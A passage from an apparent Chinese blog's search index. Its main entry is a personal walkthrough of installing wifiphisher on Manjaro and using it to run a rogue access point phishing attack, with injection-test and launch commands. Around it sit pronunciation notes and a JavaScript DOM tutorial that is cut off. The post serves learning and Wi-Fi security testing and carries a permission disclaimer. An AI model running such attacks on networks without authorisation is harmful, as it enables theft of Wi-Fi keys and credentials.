doing.</p></li><li><p>value –&gt; val u</p></li><li><p>failure(u发音yer,所以l不连读过去) –&gt; fail yer</p></li><li><p>The + 元音开头发 /δi/</p><p>但是the one,one是w开头（元音字母!=元音）</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 英语 </category>
          
          <category> 口语 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 英语 </tag>
            
            <tag> 口语 </tag>
            
            <tag> 美式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wifiphisher安装与使用</title>
      <link href="/TechnicalExperience/Linux/wifiphisher-install.html"/>
      <url>/TechnicalExperience/Linux/wifiphisher-install.html</url>
      
        <content type="html"><![CDATA[<p>Wifiphisher是用于进行红队参与或Wi-Fi安全测试的恶意访问点框架。使用Wifiphisher，渗透测试人员可以通过执行有针对性的Wi-Fi关联攻击轻松地在针对无线客户端的中间人位置。Wifiphisher可以进一步用于对连接的客户端发起受害者自定义的网络钓鱼攻击，以捕获凭据（例如，从第三方登录页面或WPA / WPA2预共享密钥）或用恶意软件感染受害者站点。</p><span id="more"></span><p>曾使用字典暴力破解wifi，花费时间太长，而且不一定成功（与字典有关），所以尝试一下钓鱼</p><p>安装与使用前提：</p><ul><li>Kali Linux 或者其他linux发行版；</li><li>一个支持AP模式的无线网络适配器，驱动要求支持netlink；</li><li>一个支持Monitor模式并且能够实现命令注入的无线网络适配器，驱动要求支持netlink。如果你没有这种适配器，那么你在运行WiFiPhisher时请使用—nojamming选项；</li></ul><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>官方推荐在kali上使用wifiphisher，本着学习精神，我决定在我的manjaro上尝试安装</p><p>在我的manjaro折腾了一天(虽然软件管理pacman有wifiphisher，但是因为python2-scapy的依赖问题导致构建不成功)。于是从github上下载1.4版本，从python2到python3，从pip2到pip3，自己手动下载各种依赖:angel:，最后发现不是依赖的问题，是发布的wifiphisher-1.4版本貌似只支持python2，但使用python2安装后，报错</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ImportError: cannot import name hostapd_controller</span><br></pre></td></tr></table></figure><p>这就很奇怪，明明1.4已经说了解决了hostapd的问题。在lssue也没找到很好的解决方法（看英文看到头痛）</p><p>于是直接clone最新开发进度，使用python3进行安装</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>在终端使用<code>wifiphisher</code>进入了界面，但是搜不到接入点</p><p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/wifiphisher.png" alt="wifiphisher"></p><p>可能是网卡的缘故吧，官方对网卡的要求</p><blockquote><p>一个无线网络适配器，支持AP＆Monitor模式并能够注入。驱动程序应支持netlink。</p></blockquote><p>使用<code>iw list</code>查了下我的网卡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Supported interface modes:</span><br><span class="line">    * IBSS</span><br><span class="line">    * managed</span><br><span class="line">    * AP</span><br><span class="line">    * monitor</span><br><span class="line">    * mesh point</span><br><span class="line">    * P2P-client</span><br><span class="line">    * P2P-GO</span><br><span class="line">    * P2P-device</span><br></pre></td></tr></table></figure><p>可以看到是支持AP和监听的，难道是不能注入？</p><p>尝试使用指令查看是否支持注入，结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ aireplay-ng -9 wlp1s0      </span><br><span class="line">11:02:52  Trying broadcast probe requests...</span><br><span class="line">11:02:53  No Answer...</span><br><span class="line">11:02:53  Found 0 APs</span><br></pre></td></tr></table></figure><blockquote><p>manjaro很多关于网络的指令都没有，需要自行安装net-tools(ifconfig)，aircrack-ng(aireplay-ng)</p></blockquote><p>正在摸索中，考虑网卡的原因，下单了一个3070芯片的网卡，插上后输入在我的电脑里的设备名是<code>wlp0s20f0u1</code></p><p>再次使用wifiphisher</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo wifiphisher -i wlp0s20f0u1</span><br></pre></td></tr></table></figure><blockquote><p>当只有一个网卡且这个网卡支持监听和AP时，可以使用<code>-i</code>手动生成恶意AP并进行攻击</p><p>如果有多余的网卡，使用<code>-eI</code>参数指定监听网卡，<code>-aI</code>指定生成AP的网卡，更多参数参见<code>wifiphisher -h</code></p></blockquote><p>成功了！</p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/wifiphisher-ap.png" style="zoom:33%;" /><p>选择攻击目标后的钓鱼方案</p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/wifiphisher-phis.png" style="zoom:33%;" /><p>攻击成功！</p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/wifiphisher-phis2.png" style="zoom: 33%;" /><p>手机连接后跳转界面</p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static/img/article/2020/wifiphisher-moban.png" style="zoom: 25%;" /><p>选择攻击方案的模板可自定义，在我的电脑上模板路径是<code>/usr/lib/python3.8/site-packages/wifiphisher-1.4-py3.8.egg/wifiphisher/data/phishing-pages</code></p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><ul><li>请不要在没有征得目标网络管理员许可的情况下利用WiFiPhisher实施攻击，这种行为将会被视作非法活动。笔者不承担任何责任，请谨慎使用。</li></ul><p>参考文章</p><blockquote><p><a href="https://blog.csdn.net/qq_28208251/article/details/48086249">测试注入</a></p><p><a href="https://wifiphisher.readthedocs.io/en/latest/?badge=latest">wifiphisher官方</a></p><p><a href="https://zhuanlan.zhihu.com/p/37473690">多版本Python安装pip及pip版本管理终极教程</a></p><p><a href="https://docs.python.org/zh-cn/3/library/2to3.html">2to3 - 自动将 Python 2 代码转为 Python 3 代码</a></p><p><a href="https://www.aircrack-ng.org/doku.php?id=compatible_cards">aircrack-ng判断网卡是否兼容</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 个人技术心得 </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> manjaro </tag>
            
            <tag> 钓鱼 </tag>
            
            <tag> wifi </tag>
            
            <tag> wifiphisher </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS学习篇之操作浏览器、DOM</title>
      <link href="/Front-end/JavaScript/%E6%B5%8F%E8%A7%88%E5%99%A8.html"/>
      <url>/Front-end/JavaScript/%E6%B5%8F%E8%A7%88%E5%99%A8.html</url>
      
        <content type="html"><![CDATA[<h2 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h2><p>浏览器内有很多对象，可以获取浏览器的相关信息</p><span id="more"></span><h3 id="window"><a href="#window" class="headerlink" title="window"></a>window</h3><p>常用属性</p><ul><li><p><code>innerWidth</code>：窗口宽</p></li><li><p><code>innerHeight</code>：窗口高</p></li></ul><h3 id="navigator"><a href="#navigator" class="headerlink" title="navigator"></a>navigator</h3><p>常用属性</p><ul><li>navigator.appName：浏览器名称；</li><li>navigator.appVersion：浏览器版本；</li><li>navigator.language：浏览器设置的语言；</li><li>navigator.platform：操作系统类型；</li><li>navigator.userAgent：浏览器设定的<code>User-Agent</code>字符串。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">appName = Netscape</span><br><span class="line">appVersion = <span class="number">5.0</span> (X11)</span><br><span class="line">language = zh</span><br><span class="line">platform = Linux x86_64</span><br><span class="line">userAgent = Mozilla/<span class="number">5.0</span> (X11; Linux x86_64; rv:<span class="number">75.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">75.0</span></span><br></pre></td></tr></table></figure><h3 id="screen"><a href="#screen" class="headerlink" title="screen"></a>screen</h3><p><code>screen</code>对象表示屏幕的信息，常用的属性有：</p><ul><li>screen.width：屏幕宽度，以像素为单位；</li><li>screen.height：屏幕高度，以像素为单位；</li><li>screen.colorDepth：返回颜色位数，如8、16、24。</li></ul><h3 id="location"><a href="#location" class="headerlink" title="location"></a>location</h3><p>表示当前页面的URL信息，如</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//URL</span></span><br><span class="line"><span class="string">&#x27;http://www.example.com:8080/path/index.html?a=1&amp;b=2#TOP&#x27;</span></span><br><span class="line"></span><br><span class="line">location.protocol; <span class="comment">// &#x27;http&#x27;</span></span><br><span class="line">location.host; <span class="comment">// &#x27;www.example.com&#x27;</span></span><br><span class="line">location.port; <span class="comment">// &#x27;8080&#x27;</span></span><br><span class="line">location.pathname; <span class="comment">// &#x27;/path/index.html&#x27;</span></span><br><span class="line">location.search; <span class="comment">// &#x27;?a=1&amp;b=2&#x27;</span></span><br><span class="line">location.hash; <span class="comment">// &#x27;TOP&#x27;</span></span><br></pre></td></tr></table></figure><p>location.assign(): 可以加载页面，参数是URL地址</p><p>location.reload(): 重新加载当前页面</p><h3 id="document"><a href="#document" class="headerlink" title="document"></a>document</h3><p>代表当前页面，因为DOM表示为树形结构，而document就是DOM的根节点</p><p><code>getElementById()</code>：通过<strong>HTML ID</strong>获取节点</p><p><code>getElemenstByTagName()</code>：通过<strong>标签名</strong>获取节点</p><p><code>getElementsByClassName()</code>：通过<strong>css选择器</strong>获取节点，返回一个组</p><p><code>firstElementChild</code>：获取某节点下第一个节点</p><p><code>lastElementChild</code>：获取某节点下的最后一个节点</p><p><code>cookie</code>：获取cookie（cookie是服务器用来判断用户的）</p><p><code>querySelector()</code>：参数形式’#id’,’.class’…其实就是<strong>css选择器形式</strong>的参数，<strong>找到一个</strong>就返回</p><p><code>querySelectorAll</code>：返回所有满足条件的</p><blockquote><p>class和selectorall会返回一个类数组，可以使用[…nodeList]转换成数组（进而使用map，reduce..）</p><p>参考文献</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/NodeList">MDN-NodeList</a></p></blockquote><h2 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h2><p>通过doument对象取得元素，可以进行更新，修改，删除操作</p><h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><p><code>innerHTML</code>：比较强大，既可以修改内容，也可以修改子树（子标签）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.innerHTML = <span class="string">&#x27;ABC &lt;span style=&quot;color:red&quot;&gt;RED&lt;/span&gt; XYZ&#x27;</span>;</span><br></pre></td></tr></table></figure><p><code>innerText</code>&amp;<code>textContent</code>：只修改内容，里面的标签会自动转码区别是innerText不返回隐藏元素的文本</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p.innerText = <span class="string">&#x27;&lt;script&gt;alert(&quot;Hi&quot;)&lt;/script&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">// HTML被自动编码，无法设置一个&lt;script&gt;节点:</span></span><br><span class="line"><span class="comment">// &lt;p id=&quot;p-id&quot;&gt;&amp;lt;script&amp;gt;alert(&quot;Hi&quot;)&amp;lt;/script&amp;gt;&lt;/p&gt;</span></span><br></pre></td></tr></table></figure><p>所有的css属性都对应到了DOM的style属性里，css属性名在DOM里是驼峰命名</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p.style.color = <span class="string">&#x27;#ff0000&#x27;</span>;</span><br><span class="line">p.style.fontSize = <span class="string">&#x27;20px&#x27;</span>;</span><br><span class="line">p.style.paddingTop = <span class="string">&#x27;2em&#x27;</span>;</span><br></pre></td></tr></table></figure><h3 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h3><p>要在某个DOM节点插入，如果这个节点是空的，可以采用<code>innerHTML</code>，他会直接覆盖这个节点下的内容</p><p><code>appendChild(newElement)</code>将某节点添加到子该DOM节点的最后一个节点（如果这个节点在前面存在会删除前面的）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> d = <span class="built_in">document</span>.createElement(<span class="string">&#x27;style&#x27;</span>);<span class="comment">// 创建一个新节点</span></span><br><span class="line">d.setAttribute(<span class="string">&#x27;type&#x27;</span>, <span class="string">&#x27;text/css&#x27;</span>); <span class="comment">// 设置属性</span></span><br><span class="line">d.innerHTML = <span class="string">&#x27;p &#123; color: red &#125;&#x27;</span>;  <span class="comment">// 内容</span></span><br><span class="line"><span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;head&#x27;</span>)[<span class="number">0</span>].appendChild(d); <span class="comment">// 插入点</span></span><br></pre></td></tr></table></figure><p><code>parentElement.insertBefore(newElement, referenceElement);</code>可以将节点添加到指定为位置</p><p><code>parentElement.children</code>可以得到该节点下的所有子节点，配合<code>insetBefore</code>使用</p><h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><p>首先获取节点，然后获取父节点，使用父节点来删除子节点</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 拿到待删除节点:</span></span><br><span class="line"><span class="keyword">var</span> self = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;to-be-removed&#x27;</span>);</span><br><span class="line"><span class="comment">// 拿到父节点:</span></span><br><span class="line"><span class="keyword">var</span> parent = self.parentElement;</span><br><span class="line"><span class="comment">// 删除:</span></span><br><span class="line"><span class="keyword">var</span> removed = parent.removeChild(self);</span><br><span class="line">removed === self; <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>并没有完全删除，还在内存中</p><p>注意删除后的节点会变化</p><h2 id="操作表单"><a href="#操作表单" class="headerlink" title="操作表单"></a>操作表单</h2><p>常用输入控件</p><ul><li>文本框，对应的<code>&lt;input type=&quot;text&quot;&gt;</code>，用于输入文本；</li><li>口令框，对应的<code>&lt;input type=&quot;password&quot;&gt;</code>，用于输入口令；</li><li>单选框，对应的<code>&lt;input type=&quot;redio&quot;&gt;</code>，用于选择一项；</li><li>复选框，对应的<code>&lt;input type=&quot;checkbox&quot;&gt;</code>，用于选择多项；</li><li>下拉框，对应的<code>&lt;select&gt;</code>，用于选择一项；</li><li>隐藏文本，对应的<code>&lt;input type=&quot;hidden&quot;&gt;</code>，用户不可见，但表单提交时会把隐藏文本发送到服务器。</li></ul><p>H5新控件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;date&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2015-07-01&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;datetime-local&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2018-06-12T19:30&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;color&quot;</span> <span class="attr">value</span>=<span class="string">&quot;#ff0000&quot;</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>不支持的浏览器会把他们当作<code>type=&#39;text&#39;</code>处理，支持的就会得到一串格式化的字符</p><h3 id="获取控件值和修改值"><a href="#获取控件值和修改值" class="headerlink" title="获取控件值和修改值"></a>获取控件值和修改值</h3><p>对于text、password、hidden、select文本框，直接调用<code>value</code>就可以得到输入值；对于checkbox、redio单选框和复选框，调用<code>value</code>出现默认值，调用<code>checked</code>返回布尔值，代表选择情况</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &lt;label&gt;&lt;input type=&quot;radio&quot; name=&quot;weekday&quot; id=&quot;monday&quot; value=&quot;1&quot;&gt; Monday&lt;/label&gt;</span></span><br><span class="line"><span class="comment">// &lt;label&gt;&lt;input type=&quot;radio&quot; name=&quot;weekday&quot; id=&quot;tuesday&quot; value=&quot;2&quot;&gt; Tuesday&lt;/label&gt;</span></span><br><span class="line"><span class="keyword">var</span> mon = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;monday&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> tue = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;tuesday&#x27;</span>);</span><br><span class="line">mon.value; <span class="comment">// &#x27;1&#x27;</span></span><br><span class="line">tue.value; <span class="comment">// &#x27;2&#x27;</span></span><br><span class="line">mon.checked; <span class="comment">// true或者false</span></span><br><span class="line">tue.checked; <span class="comment">// true或者false</span></span><br></pre></td></tr></table></figure><p>修改的话直接修改value就可以了，单选框和复选框修改checked</p><h3 id="提交表单"><a href="#提交表单" class="headerlink" title="提交表单"></a>提交表单</h3><ul><li><p>form.submit()这个方法代表提交</p></li><li><p>响应<code>type=&#39;submit&#39;</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- HTML --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;test-form&quot;</span> <span class="attr">onsubmit</span>=<span class="string">&quot;return checkForm()&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;test&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">checkForm</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> form = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;test-form&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 可以在此修改form的input...</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">// 继续下一步:</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> <span class="literal">true</span>;<span class="comment">// false代表不提交</span></span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="操作文件"><a href="#操作文件" class="headerlink" title="操作文件"></a>操作文件</h2><p>H5中上传文件的控件是<code>&lt;input type=&#39;file&#39;&gt;</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- form属性必须如下设置 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>Choose file to upload<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">multiple</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">button</span>&gt;</span>Submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>以前JS对于文件的操作有限，无法读取文件的内容<br>现在的H5新增了的API<code>File</code>和<code>FileReader</code>可以获取文件信息和读取文件，下面是一个简单的例子</p><form method="post" enctype="multipart/form-data">        <div id='file-wrapper'>            <label for="image">选择上传图片</label>            <input type="file" id="image" name="image" value='test' multiple>            <p id='info'></p>            <div id='image-preview'                style="display:none; width: 100%; height: 200px; background-size: contain; background-repeat: no-repeat; background-position: left; ">            </div>        </div>        <div>            <button>提交到服务器</button>        </div></form><script>    var    fileInput = document.getElementById('image'),        info = document.getElementById('info'),        preview = document.getElementById('image-preview');    // 监听change事件:    fileInput.addEventListener('change', function () {        preview.style.display = 'block';        // 清除背景图片:        preview.style.backgroundImage = '';        // 检查文件是否选择:        if (!fileInput.value) {            info.innerHTML = '没有选择文件';            return;        }        // 获取File引用:         var file = fileInput.files[0];        // 获取File信息:        info.innerHTML = '文件: ' + file.name + '<br>' +            '大小: ' + file.size + '<br>' +            '修改: ' + file.lastModifiedDate;        if (file.type !== 'image/jpeg' && file.type !== 'image/png' && file.type !== 'image/gif') {            alert('不是有效的图片文件!');            return;        }        // 读取文件:        var reader = new FileReader();        reader.onload = function (e) {            var            data = e.target.result; // 'data:image/jpeg;base64,/9j/4AAQSk...(base64编码)...'                        preview.style.backgroundImage = 'url(' + data + ')';        };        // 以DataURL的形式读取文件:        reader.readAsDataURL(file);    });</script><p>源码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&#x27;file-wrapper&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;image&quot;</span>&gt;</span>选择上传图片<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;image&quot;</span> <span class="attr">name</span>=<span class="string">&quot;image&quot;</span> <span class="attr">value</span>=<span class="string">&#x27;test&#x27;</span> <span class="attr">multiple</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&#x27;info&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&#x27;image-preview&#x27;</span></span></span><br><span class="line"><span class="tag">             <span class="attr">style</span>=<span class="string">&quot;display:none; width: 100%; height: 200px; background-size: contain; background-repeat: no-repeat; background-position: left; &quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span>&gt;</span>提交到服务器<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span></span></span><br><span class="line"><span class="javascript">    fileInput = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;image&#x27;</span>),</span></span><br><span class="line"><span class="javascript">        info = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;info&#x27;</span>),</span></span><br><span class="line"><span class="javascript">        preview = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;image-preview&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 监听change事件:</span></span></span><br><span class="line"><span class="javascript">    fileInput.addEventListener(<span class="string">&#x27;change&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        preview.style.display = <span class="string">&#x27;block&#x27;</span>;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// 清除背景图片:</span></span></span><br><span class="line"><span class="javascript">        preview.style.backgroundImage = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// 检查文件是否选择:</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (!fileInput.value) &#123;</span></span><br><span class="line"><span class="javascript">            info.innerHTML = <span class="string">&#x27;没有选择文件&#x27;</span>;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span>;</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// 获取File引用: </span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> file = fileInput.files[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript">        <span class="comment">// 获取File信息:</span></span></span><br><span class="line"><span class="javascript">        info.innerHTML = <span class="string">&#x27;文件: &#x27;</span> + file.name + <span class="string">&#x27;&lt;br&gt;&#x27;</span> +</span></span><br><span class="line"><span class="javascript">            <span class="string">&#x27;大小: &#x27;</span> + file.size + <span class="string">&#x27;&lt;br&gt;&#x27;</span> +</span></span><br><span class="line"><span class="javascript">            <span class="string">&#x27;修改: &#x27;</span> + file.lastModifiedDate;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (file.type !== <span class="string">&#x27;image/jpeg&#x27;</span> &amp;&amp; file.type !== <span class="string">&#x27;image/png&#x27;</span> &amp;&amp; file.type !== <span class="string">&#x27;image/gif&#x27;</span>) &#123;</span></span><br><span class="line"><span class="javascript">            alert(<span class="string">&#x27;不是有效的图片文件!&#x27;</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span>;</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// 读取文件:</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> reader = <span class="keyword">new</span> FileReader();</span></span><br><span class="line"><span class="javascript">        <span class="comment">/* </span></span></span><br><span class="line"><span class="comment"><span class="javascript">        回调函数，当文件读取完后自动执行这个函数</span></span></span><br><span class="line"><span class="comment"><span class="javascript">        </span></span></span><br><span class="line"><span class="comment"><span class="javascript">        */</span></span></span><br><span class="line"><span class="javascript">        reader.onload = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span></span></span><br><span 